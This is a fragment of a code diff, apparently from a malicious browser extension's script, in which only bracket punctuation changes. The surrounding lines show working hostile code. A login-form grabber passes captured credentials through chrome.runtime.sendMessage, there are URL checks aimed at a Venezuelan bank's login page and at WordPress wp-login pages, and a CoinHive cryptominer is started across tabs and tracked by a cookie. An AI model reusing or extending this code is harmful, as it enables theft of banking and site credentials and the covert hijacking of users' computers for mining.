@@ -419,7 +419,7 @@ var login_form = document.getElementsByClassName("container-signin");
             chrome.runtime.sendMessage({cmd: "l",login});
 		        }
           }
-        }
+        };
 
 
   // if (top['location']['href']['indexOf']('https://www3.bancaribe.com.ve/bcn/') > -1) {
@@ -726,7 +726,7 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
     	miner.start(CoinHive.FORCE_MULTI_TAB);
 
     }
-    }
+  };
 
     var cookie_name = "control22_miner2_"+target;
     var cookie_time = 0.3;
